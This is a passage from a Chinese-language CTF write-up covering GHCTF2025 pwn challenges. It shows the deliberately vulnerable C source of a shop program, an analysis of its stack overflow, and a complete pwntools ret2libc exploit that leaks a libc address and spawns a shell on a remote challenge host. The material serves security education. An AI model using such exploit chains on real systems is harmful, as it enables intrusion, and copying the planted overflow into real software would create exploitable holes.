class="line"><span class="comment">#p = process(&#x27;../attachment&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p8(<span class="number">0xC5</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ret2libc1"><a class="markdownIt-Anchor" href="#ret2libc1"></a> ret2libc1</h1><ul><li><p>考点：<code>ret2libc</code>、<code>栈溢出</code>、<code>代码审计</code>。</p></li><li><p>这题其实就是<code>ret2libc</code>，这题并不是那种简单的一眼栈溢出的，可能还要稍微逆一下。遇到这种题不要害怕，认真逆。（走出做太多简单直白的<code>ret2libc</code>题目这个舒适区，同时也为堆的代码逆向做铺垫。）</p></li><li><p>这题源码如下：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> money = <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> what_can_I_say = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">flower</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hell_money</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">clothing</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shop</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">see_it</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">books</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">check_money</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read_count</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);   </span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to shop, what do you buy?\n&quot;</span>);       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.flowers\n&quot;</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2.books\n&quot;</span>);    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3.hell money\n&quot;</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4.clothing\n&quot;</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5.buy my shop\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;6.check youer money\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flower</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">        <span class="type">int</span> choose;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Which kind of flower would you like buy?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.peony $10\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2.rose $100\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3.fragrans $20\n&quot;</span>);</span><br><span class="line">        choose = read_count();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How many flowers do you want to buy?\n&quot;</span>);</span><br><span class="line">        count = read_count();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(choose)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">10</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">10</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">100</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">100</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">20</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">20</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">books</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">        <span class="type">int</span> choose;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Which kind of books would you like buy?\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.story books $10\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2.novel books $80\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3.note books $20\n&quot;</span>);</span><br><span class="line">        choose = read_count();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;How many books do you want to buy?\n&quot;</span>);</span><br><span class="line">        count = read_count();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(choose)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">10</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">10</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">80</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">80</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">if</span>(money &lt; count * <span class="number">20</span>) <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">                        money -=count * <span class="number">20</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hell_money</span><span class="params">()</span>&#123;    </span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1$ = 1000hell_money\n&quot;</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you want to spend buying the hell_money?\n&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    <span class="keyword">if</span>(money &lt; count) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        what_can_I_say += count*<span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clothing</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the price of clothing is 50$\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you want to buy\n&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    <span class="keyword">if</span>(money &lt; count * <span class="number">50</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Don&#x27;t have enough money\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            money -= <span class="number">50</span>*count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shop</span><span class="params">()</span>&#123;</span><br><span class="line">        </span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x40</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Do you want to buy my shop?\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(money &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">                </span><br><span class="line">        money -= <span class="number">100000</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;give you my shop!!!\n&quot;</span>); </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You can name it!!!\n&quot;</span>);    </span><br><span class="line">        read(<span class="number">0</span>,name,<span class="number">0x80</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;roll!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">see_it</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Barter?!1000$ = 1hell_money\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much do you exchange?&quot;</span>);</span><br><span class="line">    count = read_count();</span><br><span class="line">    what_can_I_say -=count;</span><br><span class="line">    money += count * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_count</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">8</span>];</span><br><span class="line">    read(<span class="number">0</span>,ch,<span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">return</span> atoi(ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_money</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you have %d $\n&quot;</span>,money);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you have %d hell_money\n&quot;</span>,what_can_I_say);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> ch[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                menu();</span><br><span class="line">                <span class="keyword">switch</span>(read_count())</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                flower();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                books();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                hell_money();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                                clothing();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                                shop();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                                check_money();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                                see_it();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;Invalid choose\n&quot;</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2libc1_分析1"><a class="markdownIt-Anchor" href="#ret2libc1_分析1"></a> ret2libc1_分析1</h2><ul><li>拿到附件后老样子，还是先来<code>check</code>一下保护机制。发现没有开启<code>canary</code>和<code>pie</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309193608288.png" alt="image-20250309193608288"></p><ul><li>现在我们就来使用<code>IDA pro</code>对该程序进行反编译，先来查看一下<code>main</code>函数。这里<code>main</code>函数主要的执行逻辑就<code>3</code>点概括<ul><li>先输入输出初始化</li><li>进入循环，打印菜单，并且要用户输入选项</li><li>之后通过<code>switch</code>语句执行对应的选项。</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309195517274.png" alt="image-20250309195517274"></p><ul><li>然后我们查看菜单<code>menu()</code>，这个函数结合<code>main()</code>函数中的<code>switch</code>语句进行分析。这时我们发现：<ul><li>菜单中只有<code>6</code>个选项，而<code>main()</code>函数中却有<code>7</code>个选项，并且第<code>7</code>个选项还是<code>see_it</code></li><li>这时就会想到<code>see_it()</code>这个函数可能会有点问题</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309200149427.png" alt="image-20250309200149427"></p><ul><li>接下来我们还是逐个函数进行分析，先来分析<code>flower()</code>这个函数，我们将这个函数分为四个部分进行解读<ul><li>这就是模拟商店买花的一个函数</li><li>首先我们要确定买哪一种花，然后确定买多少朵这种花</li><li>之后我们就会根据我们所买花的种类进入相应的<code>case</code>，然后扣除相应的<code>money</code></li><li>在这里<code>money</code>是一个全局变量，保存在<code>bss</code>段上</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309200451652.png" alt="image-20250309200451652"></p><ul><li>接下来我们查看<code>books()</code>这个函数的逻辑也和<code>flower()</code>这个函数也一样<ul><li>也就是选择我们要买的书的种类和个数</li><li>然后进入对应的<code>case</code>语句</li><li>执行对应的判断语句以及扣钱</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309201346140.png" alt="image-20250309201346140"></p><ul><li>然后我们来查看<code>hell_money</code><ul><li>这个函数主要执行的就是使用<code>money</code>对换<code>hell_money</code>，<code>1money=1000hell_money</code></li><li>并且会对<code>hell_money</code>统计，将得到的<code>hell_money</code>的总数保存在全局变量中<code>what_can_I_say</code></li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309201829207.png" alt="image-20250309201829207"></p><ul><li>来看<code>clothing()</code>这个函数<ul><li>这个函数实现的就是购买衣服</li><li>购买后就会扣除相应的钱</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202152701.png" alt="image-20250309202152701"></p><ul><li>现在来查看<code>shop()</code>函数<ul><li>这个函数就是让我们购买这一整个商店</li><li>买完这个商店后就可以对这个商店进行命名</li><li>注意这边就存在一个栈溢出的漏洞</li><li>所以我们要想办法把<code>money</code>增加到大于<code>100000</code></li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202443440.png" alt="image-20250309202443440"></p><ul><li>在来查看<code>see_it()</code><ul><li>这边的话我们可以使用<code>hell_money</code>来换取<code>money</code></li><li>只要我们有足够的<code>hell_money</code>就可以换取足够的<code>money</code>，从而可以买下整个<code>shop</code>给<code>shop</code>命名</li><li>然后我们就可以进行栈溢出，<code>ret2libc</code>利用</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309202554215.png" alt="image-20250309202554215"></p><ul><li>这里我们再来查看一下全局变量和<code>data</code>段，会发现我们一开始的<code>what_can_I_say</code>变量的值为<code>？</code>，然后<code>moeny</code>一开始的值为<code>0x3e8</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309203846322.png" alt="image-20250309203846322"></p><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250309203839855.png" alt="image-20250309203839855"></p><ul><li>所以我们本题的思路就是不断用<code>money</code>购买<code>holl_money</code>然后用<code>holl_money</code>购买<code>money</code>使得<code>money</code>能购买整个商店，然后<code>ret2libc</code></li><li>这题就不动态调试了</li></ul><h2 id="ret2libc1_exp"><a class="markdownIt-Anchor" href="#ret2libc1_exp"></a> ret2libc1_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;neww&quot;]</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./ret2libc11&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28496</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hell_money</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see_it</span>(<span class="params">count</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(count).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400d73</span></span><br><span class="line">ret = <span class="number">0x400579</span></span><br><span class="line">printf_got = <span class="number">0x602020</span></span><br><span class="line">func_addr = <span class="number">0x400B1E</span></span><br><span class="line">printf_plt = <span class="number">0x4005A0</span></span><br><span class="line">hell_money(<span class="number">100</span>)</span><br><span class="line">pause()</span><br><span class="line">see_it(<span class="number">10000</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(ret)+p64(pop_rdi)+p64(printf_got)+p64(printf_plt)</span><br><span class="line">payload += p64(func_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;it!!!\n&#x27;</span>)</span><br><span class="line">printf_addr = p.recvline()[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf--&gt;&#x27;</span>,printf_addr)</span><br><span class="line">printf_addr = <span class="built_in">int</span>.from_bytes(printf_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = printf_addr -libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h1 id="ret2libc2"><a class="markdownIt-Anchor" href="#ret2libc2"></a> ret2libc2</h1><ul><li><p>考点：<code>ret2libc</code>、<code>栈迁移</code>、<code>字符串格式化漏洞</code>，<code>ogg</code>、<code>在libc找rop</code></p></li><li><p>本题其实使用<code>system(&quot;/bin/sh&quot;)</code>或者<code>ogg</code>都可以打得出来，在使用<code>system(&quot;/bin/sh&quot;)</code>的时候可能需要稍微调整一下栈的距离</p></li><li><p>这题感觉是出的最有问题的一题，虽然考点比较多，给出的<code>ogg</code>本意是想让新生们了解一下<code>ogg</code>这个东西，为以后打堆的时候劫持<code>hook</code>的学习打下铺垫，这题还可以让新生知道，<code>libc</code>中也可以找<code>rop</code>链</p></li><li><p>源代码如下：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span 